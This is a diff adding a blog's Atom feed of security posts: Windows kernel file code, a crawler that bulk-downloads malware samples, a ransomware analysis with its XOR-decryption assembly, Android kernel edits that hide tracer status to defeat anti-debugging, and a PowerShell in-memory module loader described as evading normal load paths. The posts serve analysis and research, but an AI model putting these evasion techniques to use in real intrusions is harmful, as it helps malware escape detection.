@@ -1,0 +1,441 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>ydc&#39;s blog</title>
+  
+  
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://yoursite.com/"/>
+  <updated>2018-04-19T22:11:06.307Z</updated>
+  <id>http://yoursite.com/</id>
+  
+  <author>
+    <name>Ken</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>windows内核学习:文件操作</title>
+    <link href="http://yoursite.com/posts/15ab7b57.html"/>
+    <id>http://yoursite.com/posts/15ab7b57.html</id>
+    <published>2018-04-19T22:05:46.000Z</published>
+    <updated>2018-04-19T22:11:06.307Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="文件基本操作"><a href="#文件基本操作" class="headerlink" title="文件基本操作"></a>文件基本操作</h2><pre><code class="c">NTSTATUS ntCreateFile(WCHAR *szFileName)//L&quot;\\??\\c:\\doc\\1.txt&quot;{    OBJECT_ATTRIBUTES       objAttrib   ={0};    UNICODE_STRING          uFileName   ={0};    IO_STATUS_BLOCK         io_status   = {0};    HANDLE                  hFile       = NULL;    NTSTATUS                status      = 0;    //创建文件对象之前需要初始化OBJECT_ATTRIBUTES对象。    RtlInitUnicodeString(&amp;uFileName, szFileName);    InitializeObjectAttributes(        &amp;objAttrib,        &amp; uFileName,        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,        NULL,        NULL        );    status = ZwCreateFile(            &amp;hFile,             GENERIC_WRITE,            &amp;objAttrib,             &amp;io_status,             NULL,             FILE_ATTRIBUTE_NORMAL,//如果是创建目录，此处应该为FILE_ATTRIBUTE_DIRECTORY            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,             FILE_OPEN_IF,            FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,             NULL,             0);    if(NT_SUCCESS(status))    {        ZwClose(hFile);    }    return status;}</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;文件基本操作&quot;&gt;&lt;a href=&quot;#文件基本操作&quot; class=&quot;headerlink&quot; title=&quot;文件基本操作&quot;&gt;&lt;/a&gt;文件基本操作&lt;/h2&gt;&lt;pre&gt;&lt;code class=&quot;c&quot;&gt;NTSTATUS ntCreateFile(WCHAR *szFileN
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>go程序恶意程序分析</title>
+    <link href="http://yoursite.com/posts/5e308b44.html"/>
+    <id>http://yoursite.com/posts/5e308b44.html</id>
+    <published>2018-04-14T15:39:06.000Z</published>
+    <updated>2018-04-14T15:39:49.426Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+      <category term="病毒分析" scheme="http://yoursite.com/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>病毒样本快到碗里来，一个样本下载爬虫的实现</title>
+    <link href="http://yoursite.com/posts/9222f001.html"/>
+    <id>http://yoursite.com/posts/9222f001.html</id>
+    <published>2018-04-13T16:57:23.000Z</published>
+    <updated>2018-04-14T09:34:53.474Z</updated>
+    
+    <content type="html"><![CDATA[<hr><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Malwar是一个使用了Cuckoo Sanbox的在线恶意软件分析系统，由于它提供一些病毒样本下载，就想能不能写个爬虫把样本下下来。顺便写篇博客记录下。<br>页面分析</p><p>打开 <a href="https://malwr.com/analysis" target="_blank" rel="noopener">https://malwr.com/analysis</a> ,我们可以当前页看到有TimeStamp、md5、文件名、文件类型和杀软查杀数，下一页类似。<br><img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/malwr_crawl/1.png" alt="图片说明" title="图片说明"></p><p>只有MD5的超链接可以点，点进去看看，<br><img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/malwr_crawl/2.png" alt="图片说明" title="图片说明"></p><p>我写这个的爬虫的目的是下载样本，只关心样本的下载地址，并不关心其他的信息。</p><p>现在我们可以理清下思路：</p><pre><code>   获取每一页的网页源码   解析当前页的每一个md5对应的详细信息链接   在详细信息页面解析下载地址。</code></pre><a id="more"></a><h2 id="提取规则"><a href="#提取规则" class="headerlink" title="提取规则"></a>提取规则</h2><p>先从第一页开始爬起</p><pre><code class="python">from scrapy.spiders import CrawlSpiderfrom scrapy.http import Requestfrom malwr.items import MalwrItemfrom scrapy.selector import Selectorclass BasicSpider(CrawlSpider):    name = &quot;basic&quot;    allowed_domains = [&quot;malwr.com&quot;]    strat_urls = [&#39;https://malwr.com/analysis/?page=1&#39;]    def start_requests(self):        url = self.strat_urls[0]         yield Request(url, callback=self.parse_item)    def parse_item(self):         pass</code></pre><p>scrapy支持xss选择器和css选择器，一般是用哪个比较方便就用哪个。</p><p><img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/malwr_crawl/3.png" alt="图片说明"></p><p>对应链接的xpath选择器为 <code>//td/a/@href</code>,<br><img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/malwr_crawl/4.png" alt="图片说明"></p><p>下一页的链接的xpath选择器为 <code>//a[contains(text(),&#39;Next&#39;)]/@href</code></p><p><img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/malwr_crawl/5.png" alt="图片说明"></p><p>要得到下载地址需要账号登陆，这里先不管它，单击Download下载文件对应的下载链接提取规则xpath选择器</p><p><code>//a[contains(@class,&#39;btn-primary&#39;)]/@href</code>.</p><p>现在来补充下代码，</p><pre><code class="python">def parse_item(self):      # 当前页所有md5对应的详细页面      url = response.xpath(&quot;//td/a/@href&quot;).extract()      for u in url:          url = urlparse.urljoin(&quot;https://malwr.com&quot;,u.encode(&quot;utf-8&quot;))          yield Request(url,self.parse_downurl)      # 下一页      nextpage = response.xpath(&quot;//a[contains(text(),&#39;Next&#39;)]/@href&quot;).extract()[0].encode(&#39;utf-8&#39;)      url = urlparse.urljoin(&quot;https://malwr.com&quot;,nextpage)      yield Request(url,self.parse_item) #解析下载地址def parse_downurl(self):      pass</code></pre><h2 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h2><p>之前写爬虫的时候，是可以直接通过post登陆的，而我开始写这篇文章的时候开始加上了google的ReCaptcha验证码。</p><p>只能换种方式使用selenium来登陆Malwr.得到登陆后的cookie后，我们就可以用这个cookie开始下载样本了。</p><pre><code class="python">from selenium import webdriverfrom selenium.webdriver.support.wait import WebDriverWaitdef get_cookie():        loginurl = &#39;https://malwr.com/account/login/&#39;        # 当然Ie也可以换成其他的，比如firefox、chrom等等        driver = webdriver.Ie()        driver.get(loginurl)        WebDriverWait(driver,3).until(lambda x:x.find_element_by_link_text(&#39;Logout&#39;))        cookies = driver.get_cookies()        driver.close()        return cookies</code></pre><p>使用Scrapy有一点很蛋疼，cookie它不会自动传递，需要自己在Request中传递下去，才能使后面的网络请求使用这个cookie.</p><pre><code class="python">class BasicSpider(CrawlSpider):    name = &quot;basic&quot;    allowed_domains = [&quot;malwr.com&quot;]    strat_urls = [&#39;https://malwr.com/analysis/?page=1&#39;]    custom_settings = {                    &quot;COOKIES&quot;:get_cookie(),                    }    def start_requests(self):        url = self.strat_urls[0]        # cookiejar  cookie传递        yield Request(url,cookies=self.custom_settings[&#39;COOKIES&#39;],                          callback=self.parse_item,meta = {&#39;cookiejar&#39; : 1})    def parse_item(self,response):          # 当前页所有md5对应的详细页面          url = response.xpath(&quot;//td/a/@href&quot;).extract()          for u in url:              url = urlparse.urljoin(&quot;https://malwr.com&quot;,u.encode(&quot;utf-8&quot;))              yield Request(url,self.parse_downurl,meta = {&#39;cookiejar&#39; : 1})          # 下一页          nextpage = response.xpath(&quot;//a[contains(text(),&#39;Next&#39;)]/@href&quot;).extract()[0].encode(&#39;utf-8&#39;)          url = urlparse.urljoin(&quot;https://malwr.com&quot;,nextpage)          yield Request(url,self.parse_item,meta = {&#39;cookiejar&#39; : 1})</code></pre><p>我们在start_request函数里获取到登陆后的cookie,使用<code>meta = {&#39;cookiejar&#39; : 1}</code>将cookie传递到parse_item函数。</p><p>parse_item函数的Request的两个Request也加上cookiejar,一个把cookie传给parse_item,一个传给parse_downurl,<br>下载样本</p><p>scrapy本身就已经为我们提供了很好的文件下载、图片下载的功能，</p><p>修改custom_settings,加上我们要用的ITEM_PIPELINES(在这里面实现下载功能)和FILES_STORE(保存到的文件夹)</p><pre><code>custom_settings = {                  &quot;COOKIES&quot;:get_cookie(),                  &#39;ITEM_PIPELINES&#39;:{&#39;malwr.pipelines.MalwrPipeline&#39;:1},                  &quot;FILES_STORE&quot;:&quot;E:\\Virus\\Malwr&quot;                  }</code></pre><p>FilesPipeline是从file_urls中拿到下载地址然后开始下载文件，因此我们还需要Item.py定义一个file_urls.</p><pre><code class="python"># Define here the models for your scraped items## See documentation in:# http://doc.scrapy.org/en/latest/topics/items.htmlimport scrapyclass MalwrItem(scrapy.Item):    # define the fields for your item here like:    # name = scrapy.Field()    file_urls = scrapy.Field()</code></pre><p>在piplines.py文件实现文件的下载方法,继承FilesPipeline下载文件。</p><p>由于下载文件需要cookie，因此重写了构造函数和get_media_requests函数，在Request中加上了cookies参数.</p><p>我们在custom_settings中保存了cookie，这里直接使用getlist拿到登陆后的cookie.</p><pre><code class="python"># Define your item pipelines here## Don&#39;t forget to add your pipeline to the ITEM_PIPELINES setting# See: http://doc.scrapy.org/en/latest/topics/item-pipeline.htmlfrom scrapy.http import Requestfrom scrapy.pipelines.files import FilesPipelineclass MalwrPipeline(FilesPipeline):    cookies = []    def __init__(self, store_uri, download_func=None, settings=None):        super(MalwrPipeline,self).__init__(store_uri, download_func,settings)        self.cookies = settings.getlist(&quot;COOKIES&quot;)    # 开始下载文件    def get_media_requests(self, item, info):        for file_url in item[&#39;file_urls&#39;]:            yield Request(file_url,cookies=self.cookies)</code></pre><p>解析下载地址，将解析到的下载链接列表放入item的file_urls,返回item。pipeline会file_urls拿到链接开始调用get_media_requests下载文件</p><pre><code class="python">    def parse_downurl(self,response):        try:            # 提取点击下载按钮的下载地址            url = response.xpath(&quot;//a[contains(@class,&#39;btn-primary&#39;)]/@href&quot;).extract()[0].encode(&#39;utf-8&#39;)            url = urlparse.urljoin(&quot;https://malwr.com&quot;,url)            item = MalwrItem()            item[&#39;file_urls&#39;] = [url]            return item        except Exception,e:            passreturn</code></pre><p>最后附上完整的源码 <a href="https://github.com/ydc1992/Malwr" target="_blank" rel="noopener">https://github.com/ydc1992/Malwr</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;hr&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;Malwar是一个使用了Cuckoo Sanbox的在线恶意软件分析系统，由于它提供一些病毒样本下载，就想能不能写个爬虫把样本下下来。顺便写篇博客记录下。&lt;br&gt;页面分析&lt;/p&gt;&lt;p&gt;打开 &lt;a href=&quot;https://malwr.com/analysis&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://malwr.com/analysis&lt;/a&gt; ,我们可以当前页看到有TimeStamp、md5、文件名、文件类型和杀软查杀数，下一页类似。&lt;br&gt;&lt;img src=&quot;http://7vznhx.com1.z0.glb.clouddn.com/static/images/malwr_crawl/1.png&quot; alt=&quot;图片说明&quot; title=&quot;图片说明&quot;&gt;&lt;/p&gt;&lt;p&gt;只有MD5的超链接可以点，点进去看看，&lt;br&gt;&lt;img src=&quot;http://7vznhx.com1.z0.glb.clouddn.com/static/images/malwr_crawl/2.png&quot; alt=&quot;图片说明&quot; title=&quot;图片说明&quot;&gt;&lt;/p&gt;&lt;p&gt;我写这个的爬虫的目的是下载样本，只关心样本的下载地址，并不关心其他的信息。&lt;/p&gt;&lt;p&gt;现在我们可以理清下思路：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;   获取每一页的网页源码
+   解析当前页的每一个md5对应的详细信息链接
+   在详细信息页面解析下载地址。
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+    
+      <category term="爬虫" scheme="http://yoursite.com/tags/%E7%88%AC%E8%99%AB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>一款勒索软件的分析-未完待续</title>
+    <link href="http://yoursite.com/posts/4c8ebd7f.html"/>
+    <id>http://yoursite.com/posts/4c8ebd7f.html</id>
+    <published>2018-04-13T16:56:09.000Z</published>
+    <updated>2018-04-13T16:59:56.805Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>文件信息 SHA1:1d03f92b8f824bb065552f0d9e6ddddb</p></blockquote><h2 id="NSIS脚本分析"><a href="#NSIS脚本分析" class="headerlink" title="NSIS脚本分析"></a>NSIS脚本分析</h2><p>使用7zip解压，可以看到其中一个文件是乱码，可能是加密的shellcode。</p><p><img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/1021_troj/2.png" alt="图片说明" title="图片说明"></p><p>下图是nsis的脚本，前面有很多都是无用的代码，一般都是首先看.oninit回调函数。</p><p>我们可以看到它通过wsprintf来拼接字符串，使用nsis的system.dll来调用外部dll。 将加密的shellcode映射到内存,</p><p><img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/1021_troj/1.png" alt="图片说明" title="图片说明"><br><a id="more"></a><br>另外system::call相关语法可以在<a href="http://nsis.sourceforge.net/Docs/System/System.html" target="_blank" rel="noopener">http://nsis.sourceforge.net/Docs/System/System.html</a> 找到。</p><p>最终通过</p><pre><code class="cpp">    System::Call &quot;$5p r13, i 66576)</code></pre><p>进入shellcode执行代码，shellcode入口点地址是r12,即<code>$R1 + 73991</code>。R1等于r11,也就是调用readFile函数时返回得文件buffer.</p><p>r13为加密PE文件，大小为66576，地址为0x83c0e69(<code>$R1 + 3689</code>);</p><h2 id="加密文件分析"><a href="#加密文件分析" class="headerlink" title="加密文件分析"></a>加密文件分析</h2><h3 id="解密shellcode"><a href="#解密shellcode" class="headerlink" title="解密shellcode"></a>解密shellcode</h3><p>载入OD，直接在System.dll!Int640p函数下断，</p><p><img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/1021_troj/32.png" alt="图片说明" title="图片说明"></p><p>文件被映射到0x83c0000,因此shellcode的入口点在0x83d2107。</p><p>来到0x83d2107处，</p><p><img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/1021_troj/4.png" alt="图片说明" title="图片说明"></p><p>查找内存值为0xDEADBEEF的内存地址，0xDEADBEEF为加密标志，表示后面的内容是加密的。</p><pre><code class="x86asm">        mov ecx,0xDEADBEEF        call 083D216C          mov dword ptr ss:[esp],eax ;esp=0x83d2118        mov ebx,dword ptr ss:[esp]        inc ebx        cmp dword ptr ds:[ebx],ecx        jnz X083D211E</code></pre><p>0xDEADBEEF后面有2个比较重要的数据。</p><pre><code class="cpp">struct stc_encode{    DWORD flag; //0xDEDBEEF    DWORD codeSize;    DWORD originCode_head; //未加密代码头四个字节    char  encode_code[codeSize];}</code></pre><p>从下面这段汇编代码可以看出，它没有把xor key硬编码到程序中，而是通过暴破的方式获取xor key。这个样本最后查找到的xor key为</p><p>0x6b891276</p><pre><code class="x86asm">        mov edx,dword ptr ss:[esp+0xC] ;[esp+0xc] 异或后的函数头部        mov edx,dword ptr ds:[edx]        xor edx,ebx        cmp edx,dword ptr ss:[esp+0x8] ;[esp+0x8] 原始函数头部        je X083D214B        inc ebx       ;从0开始递增xor key,        jmp X083D213A</code></pre><p>找到key，随后就是解密异或后的代码。</p><pre><code class="x86asm">        mov dword ptr ss:[esp+0x10],ebx;xor key        nop        nop        nop        mov edx,dword ptr ss:[esp+0xC]        xor ecx,ecx        xor dword ptr ds:[edx+ecx],ebx        cmp ecx,dword ptr ss:[esp+0x4]        jge X083D2166        add ecx,0x4        jmp X083D2158        mov esp,ebp        pop ebp        pop ebx        jmp edx ;跳到解密后的函数执行</code></pre><p>这里<code>jmp edx</code>跳转到解密后的shellcode执行。继续以同样的方式解密3次，且每次的xor key都不一样。</p><h3 id="解密PE文件"><a href="#解密PE文件" class="headerlink" title="解密PE文件"></a>解密PE文件</h3><p><img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/1021_troj/5.png" alt="图片说明" title="图片说明"></p><p>通过 find_api_address找到所需要的函数并拷贝到堆栈。调用这些函数时使用 <code>call [ebp-xx]</code>调用。</p><p><img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/1021_troj/6.png" alt="图片说明" title="图片说明"></p><blockquote><p>decrypt_pe有三个参数:被加密PE文件buffer、文件大小和密钥。该函数通过使用Crypt API来解密,返回解密后的PE文件地址。</p></blockquote><p><img src="http://7vznhx.com1.z0.glb.clouddn.com/static/images/1021_troj/7.png" alt="图片说明" title="图片说明"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;blockquote&gt;&lt;p&gt;文件信息 SHA1:1d03f92b8f824bb065552f0d9e6ddddb&lt;/p&gt;&lt;/blockquote&gt;&lt;h2 id=&quot;NSIS脚本分析&quot;&gt;&lt;a href=&quot;#NSIS脚本分析&quot; class=&quot;headerlink&quot; title=&quot;NSIS脚本分析&quot;&gt;&lt;/a&gt;NSIS脚本分析&lt;/h2&gt;&lt;p&gt;使用7zip解压，可以看到其中一个文件是乱码，可能是加密的shellcode。&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;http://7vznhx.com1.z0.glb.clouddn.com/static/images/1021_troj/2.png&quot; alt=&quot;图片说明&quot; title=&quot;图片说明&quot;&gt;&lt;/p&gt;&lt;p&gt;下图是nsis的脚本，前面有很多都是无用的代码，一般都是首先看.oninit回调函数。&lt;/p&gt;&lt;p&gt;我们可以看到它通过wsprintf来拼接字符串，使用nsis的system.dll来调用外部dll。 将加密的shellcode映射到内存,&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;http://7vznhx.com1.z0.glb.clouddn.com/static/images/1021_troj/1.png&quot; alt=&quot;图片说明&quot; title=&quot;图片说明&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>AOSP-docker编译安卓源码绕过反调试</title>
+    <link href="http://yoursite.com/posts/7b82cd68.html"/>
+    <id>http://yoursite.com/posts/7b82cd68.html</id>
+    <published>2018-04-13T16:48:50.000Z</published>
+    <updated>2018-04-13T17:00:06.535Z</updated>
+    
+    <content type="html"><![CDATA[<p>看了很多编译源码的文章，发现很多都有坑，大部分都是环境配置问题，编译不同版本的源码jdk版本不一样，ubuntu版本也不一样。这很让人蛋疼，光是折腾环境就得半天了。</p><p>自从有了docker就不一样了，有人把Android源码编译的环境打包成了docker，就是AOSP docker;这样我们就不需要去折腾环境,直接拿人家弄好的来用。</p><p>推荐使用linux装docker，不用管是debian还是ubuntu;虽然windows也可以使用docker，但是还是有点小问题。<br><a id="more"></a></p><h2 id="分配硬盘"><a href="#分配硬盘" class="headerlink" title="分配硬盘"></a>分配硬盘</h2><p>linux至少要分配100g的硬盘空间。空间足够的可以跳过，原本装有VMWare linux，但是空间不足，又不想重新装个虚拟机。 可以参考 这篇文章<a href="http://blog.csdn.net/u010372981/article/details/46514011" target="_blank" rel="noopener">http://blog.csdn.net/u010372981/article/details/46514011</a> 给虚拟机加块硬盘。</p><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><p>默认源中没有docker,我们需要在添加backports源，在/etc/apt/sources.list文件 加入下面这行</p><pre><code>  deb http://http.debian.net/debian jessie-backports main</code></pre><p>运行如下命令安装docker</p><pre><code>apt-get updateapt-get install docker.io</code></pre><h2 id="开始编译"><a href="#开始编译" class="headerlink" title="开始编译"></a>开始编译</h2><p>1.开始之前先启动docker服务,不然到后面会报错</p><pre><code> /etc/init.d/docker start</code></pre><p>2.设置AOSP_VOL环境变量,设置为你要存放源码的路径,给VMWare添加硬盘扩容的设置成挂载的硬盘的路径。我设置的/Android路径</p><pre><code>export AOSP_VOL=/Android</code></pre><p>3.下载Wrapper脚本,我这里演示编译kitkat(Android 4.4),编译其他版本可以参考<a href="https://github.com/tiann/docker-aosp" target="_blank" rel="noopener">https://github.com/tiann/docker-aosp</a>, 脚本根对国内环境做了优化，使用速度比较快的清华源。</p><pre><code>curl -O https://raw.githubusercontent.com/tiann/docker-aosp/master/tests/build-kitkat.sh</code></pre><p>4.编译源码,直接运行上一步下载下来的源码。该脚本会下载docker镜像，并且下载Android源码到AOSP_VOL指定的路径，然后编译。</p><pre><code>sh ./build-kitkat.sh</code></pre><p>编译完成后,使用的是系统默认自带的内核，我们还需要重新修改编译内核绕过反调试</p><h2 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h2><ol><li>clone内核源码 我使用的手机是Nexus 5,对应的内核源码为kernel/msm。设备名是hammerhead</li></ol><p>在存放源码的目录创建kernel文件夹，我这里存放源码目录为/Android</p><pre><code>cd /Android/aospmkdir kernelcd kernelgit clone https://aosp.tuna.tsinghua.edu.cn/kernel/msm.git</code></pre><ol><li>选择系统版本 切换到克隆下来的源码目录，切换分支</li></ol><pre><code>git branch -a</code></pre><p>找到名字带有 hammerhead的。</p><pre><code>git checkout remotes/origin/android-msm-hammerhead-3.4-kitkat-mr1</code></pre><ol><li>修改源码</li></ol><p>需要修改<code>kernel/msm/fs/proc/base.c</code>和<code>kernel/msm/fs/proc/array.c</code>两个文件</p><p>base.c中 <code>proc_pid_wchan</code>函数部分修改成如下：</p><pre><code>//省略else {           if (strstr(symname, &quot;trace&quot;)) {                return sprintf(buffer, &quot;%s&quot;, &quot;sys_epoll_wait&quot;);           }           return sprintf(buffer, &quot;%s&quot;, symname);      }</code></pre><p>array.c中<code>tast_state</code>函数部分修改成</p><pre><code>&quot;Gid:\t%d\t%d\t%d\t%d\n&quot;,              get_task_state(p),              task_tgid_nr_ns(p, ns),              pid_nr_ns(pid, ns),              ppid, /*tpid*/0,              cred-&gt;uid, cred-&gt;euid, cred-&gt;suid, cred-&gt;fsuid,              cred-&gt;gid, cred-&gt;egid, cred-&gt;sgid, cred-&gt;fsgid);</code></pre><p><code>task_state_array</code>变量修改成</p><pre><code class="cpp">static const char * const task_state_array[] = {     &quot;R (running)&quot;,        /*    0 */     &quot;S (sleeping)&quot;,       /*    1 */     &quot;D (disk sleep)&quot;,     /*    2 */     &quot;S (sleeping)&quot;,       /*    4 */     &quot;S (sleeping)&quot;, /*     8 */     &quot;Z (zombie)&quot;,         /*  16 */     &quot;X (dead)&quot;,           /*  32 */     &quot;x (dead)&quot;,           /*  64 */     &quot;K (wakekill)&quot;,       /* 128 */     &quot;W (waking)&quot;,         /* 256 */};</code></pre><ol><li>创建编译脚本 在<code>/Android/aosp/kernel/msm</code>目录,即内核源码所在的目录创建一个脚本，内容如下,保存为run.sh. PATH前面的gcc路径为编译工具链,用来编译内核的。</li></ol><pre><code class="bash">export PATH=&#39;/Android/aosp/prebuilts/gcc/linux-x86/arm/arm-eabi-4.6/bin&#39;;$PATHexport ARCH=armexport SUBARCH=armexport CROSS_COMPILE=arm-eabi-make hammerhead defconfigmake -j4</code></pre><p>然后运行该脚本开始编译内核</p><pre><code>sh run.sh</code></pre><p>出现如下提示表示内核已经编译ok</p><pre><code>CALL    scripts/checksyscalls.shCHK     include/generated/compile.hKernel: arch/arm/boot/Image is readyLD      arch/arm/boot/compressed/vmlinuxOBJCOPY arch/arm/boot/zImageKernel: arch/arm/boot/zImage is readyCAT     arch/arm/boot/zImage-dtbKernel: arch/arm/boot/zImage-dtb is ready</code></pre><p>在<code>/Android/aosp/kernel/msm/arch/arm/boot</code>找到zImage-dtb,这个是nexus 5内核文件,拷贝到<code>/Android/aosp/device/lge/hammerhead-kernel</code>覆盖原来的文件</p><ol><li>下载驱动设备 要刷机到实体机,还需要下载三个驱动设备</li></ol><p>从<a href="https://developers.google.com/android/drivers找到对应的驱动设备。" target="_blank" rel="noopener">https://developers.google.com/android/drivers找到对应的驱动设备。</a></p><p>搜索Nexus 5找到对应的系统版本，我的是Android 4.4.4。找到的结果如下：</p><p>Nexus 5 (GSM/LTE) binaries for Android 4.4.4 (KTU84P)</p><table><thead><tr><th>Hardware Component</th><th>Company</th><th>Download</th><th>SHA-256 Checksum</th></tr></thead><tbody><tr><td>NFC, Bluetooth, Wi-Fi</td><td>Broadcom</td><td>Link</td><td>f258605e24c9c3d4e78c9af934f3516a4f8d3410da697005fad42cad36c5ed5c</td></tr><tr><td>Camera, Sensors, Audio</td><td>LG</td><td>Link</td><td>fc72704e0fba9c51c6505ae009e474570de27ee8565d51483368d8dae6c0f44e</td></tr><tr><td>Graphics, GSM, Camera, GPS, Sensors, Media, DSP, USB</td><td>Qualcomm</td><td>Link</td><td>8603d85ad511346d65c27c3747919da280523b86d55a39dfce657a4ca1b0685b</td></tr></tbody></table><p>Download对应的是下载连接，我们把这三个文件下载后解压到/Android/AOSP目录。得到三个sh脚本文件 <code>extract-broadcom-hammerhead.sh</code>、<code>extract-lge-hammerhead.sh</code>和<code>extract-qcom-hammerhead.sh</code>;</p><p>分别运行它们</p><pre><code>sh extract-broadcom-hammerhead.shsh extract-lge-hammerhead.shsh extract-qcom-hammerhead.sh</code></pre><p>一直按回车，等到如下提示输入 I ACCEPT。</p><pre><code>Type &quot;I ACCEPT&quot; if you agree to the terms of the license: You didn&#39;t accept the license. Extraction aborted.</code></pre><ol><li>再次编译源码 再次运行编译脚本重新编译,这次会很快</li></ol><pre><code>sh ./build-kitkat.sh</code></pre><h2 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h2><p>先确定bootloader有没有解锁,没解锁是刷不进去的。</p><p>Nexus 5 是两个音量键和开机键一起一直按到出现bootloader界面。usb连接手机，输入以下命令</p><pre><code class="bash">fastboot oem unlock</code></pre><p>这个是Nexus 5的解锁方式</p><p>Android源码编译成功后,文件保存在<code>/Android/aosp/out/target/product/hammerhead</code>。</p><p>输入如下命令就可以刷入实体机了。</p><pre><code class="bash">cd /Android/aosp/out/target/product/hammerheadAdb reboot bootloaderFastboot -w flashall</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://blog.csdn.net/gaisylly/article/details/50113791" target="_blank" rel="noopener">http://blog.csdn.net/gaisylly/article/details/50113791</a><br><a href="https://github.com/tiann/docker-aosp" target="_blank" rel="noopener">https://github.com/tiann/docker-aosp</a><br><a href="http://weishu.me/2016/12/30/simple-way-to-compile-android-source/" target="_blank" rel="noopener">http://weishu.me/2016/12/30/simple-way-to-compile-android-source/</a><br><a href="http://bbs.pediy.com/thread-213481.htm" target="_blank" rel="noopener">http://bbs.pediy.com/thread-213481.htm</a><br><a href="http://blog.csdn.net/sunao2002002/article/details/53057374" target="_blank" rel="noopener">http://blog.csdn.net/sunao2002002/article/details/53057374</a><br><a href="https://developers.google.com/android/drivers" target="_blank" rel="noopener">https://developers.google.com/android/drivers</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;看了很多编译源码的文章，发现很多都有坑，大部分都是环境配置问题，编译不同版本的源码jdk版本不一样，ubuntu版本也不一样。这很让人蛋疼，光是折腾环境就得半天了。&lt;/p&gt;&lt;p&gt;自从有了docker就不一样了，有人把Android源码编译的环境打包成了docker，就是AOSP docker;这样我们就不需要去折腾环境,直接拿人家弄好的来用。&lt;/p&gt;&lt;p&gt;推荐使用linux装docker，不用管是debian还是ubuntu;虽然windows也可以使用docker，但是还是有点小问题。&lt;br&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>内存中加载modlue</title>
+    <link href="http://yoursite.com/posts/a9796658.html"/>
+    <id>http://yoursite.com/posts/a9796658.html</id>
+    <published>2018-02-20T20:44:29.000Z</published>
+    <updated>2018-04-14T04:34:12.904Z</updated>
+    
+    <content type="html"><![CDATA[<script src="https://cdn.bootcss.com/highlight.js/9.12.0/languages/powershell.min.js"></script><p>内存中加载modlue</p><pre><code class="powershell">    $Domain = [AppDomain]::CurrentDomain    $DynAssembly = New-Object System.Reflection.AssemblyName(&#39;TempAssembly&#39;)    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule(&#39;TempModule&#39;)    $ModuleBuilder2 = $AssemblyBuilder.DefineDynamicModule(&#39;hello.dll&#39;)    $TypeBuilder = $ModuleBuilder.DefineType(&#39;TempClass&#39;, [Reflection.TypeAttributes]::Public)    $TypeBuilder.CreateType()    $HelloDllBytes = [Convert]::FromBase64String(&#39;{PE base64}&#39;)    # Calling LoadModule doesn&#39;t pass through the internal nLoad method like Assembly/AppDomain.Load does. :)    $HelloDllModule = [TempClass].Assembly.LoadModule(&#39;hello.dll&#39;, $HelloDllBytes)    # Invoke the Hello method within the hello.dll module that was loaded in memory    $HelloDllModule.GetTypes()[0].GetMethod(&#39;Hello&#39;).Invoke($null, @())</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;script src=&quot;https://cdn.bootcss.com/highlight.js/9.12.0/languages/powershell.min.js&quot;&gt;&lt;/script&gt;&lt;p&gt;内存中加载modlue&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;powershel
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>豆约翰博客备份专家破解</title>
+    <link href="http://yoursite.com/posts/9d7b1fcb.html"/>
+    <id>http://yoursite.com/posts/9d7b1fcb.html</id>
+    <published>2016-10-30T12:14:54.000Z</published>
+    <updated>2018-04-04T16:57:40.444Z</updated>
+    
